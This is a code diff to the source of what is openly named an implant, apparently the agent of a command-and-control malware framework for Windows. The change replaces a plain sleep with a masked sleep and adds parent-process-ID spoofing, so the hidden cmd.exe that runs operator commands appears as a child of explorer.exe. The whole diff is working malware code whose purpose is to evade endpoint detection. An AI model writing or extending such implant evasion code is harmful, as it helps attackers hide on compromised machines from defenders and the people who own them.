@@ -868,7 +868,7 @@ static VOID SleepWithJitter(DWORD dwSleepMs, DWORD dwJitterPct) {
         DWORD dwMax = dwSleepMs + dwJitter;
         dwSleepMs = dwMin + (GetTickCount() % (dwMax - dwMin + 1));
     }
-    Sleep(dwSleepMs);
+    MaskedSleep(dwSleepMs);
 }
 
 // =============================================
@@ -931,12 +931,34 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                             HANDLE hReadPipe, hWritePipe;
                             SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
                             if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
-                                STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA),
-                                    .dwFlags = STARTF_USESTDHANDLES,
-                                    .hStdOutput = hWritePipe, .hStdError = hWritePipe };
+                                // PPID Spoofing: make cmd.exe appear as child of explorer.exe
+                                STARTUPINFOEXA siEx = { 0 };
+                                siEx.StartupInfo.cb      = sizeof(STARTUPINFOEXA);
+                                siEx.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
+                                siEx.StartupInfo.hStdOutput = hWritePipe;
+                                siEx.StartupInfo.hStdError  = hWritePipe;
+
+                                HANDLE hSpoofParent = GetSpoofParentHandle();
+                                LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
+                                DWORD dwCreateFlags = CREATE_NO_WINDOW;
+
+                                if (hSpoofParent) {
+                                    SIZE_T cbAttrList = 0;
+                                    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttrList);
+                                    pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttrList);
+                                    if (pAttrList &&
+                                        InitializeProcThreadAttributeList(pAttrList, 1, 0, &cbAttrList) &&
+                                        UpdateProcThreadAttribute(pAttrList, 0,
+                                            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                            &hSpoofParent, sizeof(HANDLE), NULL, NULL)) {
+                                        siEx.lpAttributeList = pAttrList;
+                                        dwCreateFlags |= EXTENDED_STARTUPINFO_PRESENT;
+                                    }
+                                }
+
                                 PROCESS_INFORMATION pi = { 0 };
                                 if (CreateProcessA(NULL, szCmd, NULL, NULL, TRUE,
-                                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                                    dwCreateFlags, NULL, NULL, &siEx.StartupInfo, &pi)) {
                                     CloseHandle(hWritePipe);
                                     WaitForSingleObject(pi.hProcess, 30000);
 
@@ -961,6 +983,9 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                                     CloseHandle(hWritePipe);
                                     strcpy(res->szError, "CreateProcess failed");
                                 }
+
+                                if (pAttrList) { DeleteProcThreadAttributeList(pAttrList); HeapFree(GetProcessHeap(), 0, pAttrList); }
+                                if (hSpoofParent) CloseHandle(hSpoofParent);
                                 CloseHandle(hReadPipe);
                             }
                         }
